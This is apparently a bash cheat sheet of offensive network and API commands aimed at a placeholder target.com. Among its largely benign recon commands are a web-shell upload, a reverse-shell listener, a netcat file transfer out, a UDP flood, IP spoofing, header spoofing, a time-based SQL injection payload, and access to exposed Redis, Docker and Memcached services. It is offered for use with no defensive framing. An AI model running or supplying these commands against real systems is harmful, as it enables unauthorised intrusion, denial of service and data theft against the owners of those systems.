#!/bin/bash
# =====================================================
# SERVICE INTERACTION BIBLE (100+ COMMANDS)
# =====================================================
# For API Exploitation, Network Services, and Protocol Manipulation

### 1. HTTP/HTTPS INTERACTION (25+ Methods) ###

# 1. Basic API Requests
curl -X GET "https://api.target.com/v1/users" -H "Authorization: Bearer $TOKEN" | jq
curl -X POST "https://api.target.com/login" -d '{"user":"admin","password":"pass"}' -H "Content-Type: application/json"

# 2. Advanced Authentication
curl -u admin:password https://target.com/private
curl --negotiate -u : https://target.com/kerberos-area
curl --ntlm -u DOMAIN\\user:pass https://target.com/ntlm-auth

# 3. Header Manipulation
curl -H "X-Forwarded-For: 127.0.0.1" -H "User-Agent: Mozilla/5.0" https://target.com
curl -H "Host: admin.target.com" http://192.168.1.100

# 4. File Upload/Download
curl -F "file=@shell.php" https://target.com/upload.php
curl -O https://target.com/secret.pdf

# 5. WebSocket Interaction
wscat -c "wss://target.com/live-updates"
curl --include --no-buffer --header "Connection: Upgrade" --header "Upgrade: websocket" https://target.com/ws

### 2. NETCAT MASTERY (20+ Techniques) ###

# 1. Basic Listener
nc -lvnp 4444
ncat -lvnp 4444 --ssl

# 2. File Transfer
nc -vn 192.168.1.100 4444 < backup.zip  # Send
nc -lvnp 4444 > received.zip            # Receive

# 3. Port Scanning
nc -zv target.com 20-30

# 4. HTTP Interaction
printf "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
nc target.com 80 < http_request.txt

# 5. Reverse Shell Handling
rlwrap nc -lvnp 4444  # For better shell interaction

### 3. PROTOCOL-SPECIFIC TOOLS (30+ Commands) ###

# 1. DNS
dig @8.8.8.8 target.com ANY
dnsenum --enum target.com

# 2. SMTP
swaks --to user@target.com --from test@domain.com --server mail.target.com
smtp-user-enum -M VRFY -U users.txt -t mail.target.com

# 3. FTP
ftp target.com
lftp -u "user,pass" target.com

# 4. SMB
smbclient -L //target.com -U "user%pass"
crackmapexec smb target.com -u user -p pass --shares

# 5. SQL
sqsh -S server -U user -P password
mysql -h target.com -u root -p

### 4. API EXPLOITATION (15+ Chains) ###

# 1. GraphQL
curl -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' https://api.target.com/graphql

# 2. REST Parameter Fuzzing
ffuf -u https://api.target.com/v1/users?FUZZ=test -w wordlist.txt -fs 42

# 3. JWT Tampering
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xxxx -T

# 4. OAuth Testing
oauth2-proxy --client-id=XXXX --client-secret=XXXX --provider=github

### 5. RAW SOCKET MANIPULATION (10+ Methods) ###

# 1. Custom TCP Client
python3 -c "import socket; s=socket.socket(); s.connect(('target.com',80)); s.send(b'GET / HTTP/1.1\r\nHost: target.com\r\n\r\n'); print(s.recv(4096))"

# 2. ICMP Ping
hping3 -1 -c 5 target.com

# 3. UDP Flood Test
hping3 --udp -p 53 --flood target.com

# 4. IP Spoofing
hping3 -a 192.168.1.100 -p 80 -S target.com

### 6. SERVICE-SPECIFIC EXPLOITATION (20+ Examples) ###

# 1. Redis
redis-cli -h target.com CONFIG GET *
echo -e "INFO\nQUIT" | nc target.com 6379

# 2. Memcached
echo "stats items" | nc target.com 11211

# 3. Elasticsearch
curl -X GET "http://target.com:9200/_cat/indices?v"

# 4. Docker
docker -H tcp://target.com:2375 ps -a

### MEGA WORKFLOWS ###

# 1. Full API Testing Chain
curl -s https://api.target.com/v1/users | jq '.[] | id' | parallel -j 20 "curl -s https://api.target.com/v1/users/{} | jq"

# 2. Automated Service Enumeration
nmap -sV -p- -oA services target.com
cat services.nmap | grep "open/tcp" | awk '{print $1}' | cut -d'/' -f1 | while read p; do case $p in 80) curl http://target.com;; 443) curl -k https://target.com;; esac; done

# 3. Protocol Dumping
tcpdump -i eth0 'port 3306' -w mysql.pcap
tshark -r mysql.pcap -Y "mysql.query" -T fields -e mysql.query

### PRO TIPS ###

# 1. Automation with Parallel
cat endpoints.txt | parallel -j 20 "curl -s {} | jq"

# 2. Session Maintenance
curl -c cookies.txt -b cookies.txt -L https://target.com/login

# 3. Debugging HTTPS
curl -v -k --trace-ascii debug.txt https://target.com

# 4. Time-based Blind Testing
time curl -X POST "https://target.com/login" -d "user=admin' AND SLEEP(5)--"